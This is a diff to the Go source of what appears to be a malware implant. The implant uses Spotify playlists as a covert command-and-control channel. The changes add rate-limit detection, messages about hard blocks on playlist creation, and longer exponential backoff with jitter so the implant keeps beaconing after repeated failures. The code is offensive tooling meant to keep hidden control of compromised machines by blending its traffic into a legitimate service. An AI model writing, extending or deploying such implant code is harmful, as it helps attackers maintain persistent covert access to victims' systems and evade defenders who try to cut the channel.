@@ -99,9 +99,25 @@ func (imp *Implant) sendCheckin() {
 
 	err = imp.client.WriteC2Playlists(ctx, chunks)
 	if err != nil {
-		fmt.Printf("[!] Checkin failed at %s: %v\n",
-			time.Now().Format("15:04:05"), err)
-		fmt.Println("[*] Will retry on next poll cycle")
+		if isRateLimit(err) {
+			retryAfter := parseRetryAfter(err)
+			if retryAfter > 3600 {
+				fmt.Printf("[!] Spotify WRITE BLOCKED at %s for %s\n"+
+					"    Playlist creation is hard-blocked by Spotify.\n"+
+					"    This is from earlier rapid API usage. It will auto-lift.\n"+
+					"    Implant will keep retrying with backoff.\n",
+					time.Now().Format("15:04:05"), formatDuration(retryAfter))
+			} else if retryAfter > 0 {
+				fmt.Printf("[!] Rate limited at %s, retry after %s\n",
+					time.Now().Format("15:04:05"), formatDuration(retryAfter))
+			} else {
+				fmt.Printf("[!] Rate limited at %s\n",
+					time.Now().Format("15:04:05"))
+			}
+		} else {
+			fmt.Printf("[!] Checkin failed at %s: %v\n",
+				time.Now().Format("15:04:05"), err)
+		}
 		imp.checkinPending = true
 		return
 	}
@@ -201,9 +217,11 @@ func (imp *Implant) Run() {
 		// Calculate sleep: normal jitter + exponential backoff on failures
 		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
 		if imp.consecutiveFails > 0 {
-			// Exponential backoff: 30s, 60s, 120s, 240s, max 300s
+			// Exponential backoff: 30s, 60s, 120s, 240s, 300s, then 600s
 			backoff := 30 * (1 << (imp.consecutiveFails - 1))
-			if backoff > 300 {
+			if imp.consecutiveFails > 5 {
+				backoff = 600 // 10min after sustained failures (likely hard block)
+			} else if backoff > 300 {
 				backoff = 300
 			}
 			sleepTime = backoff
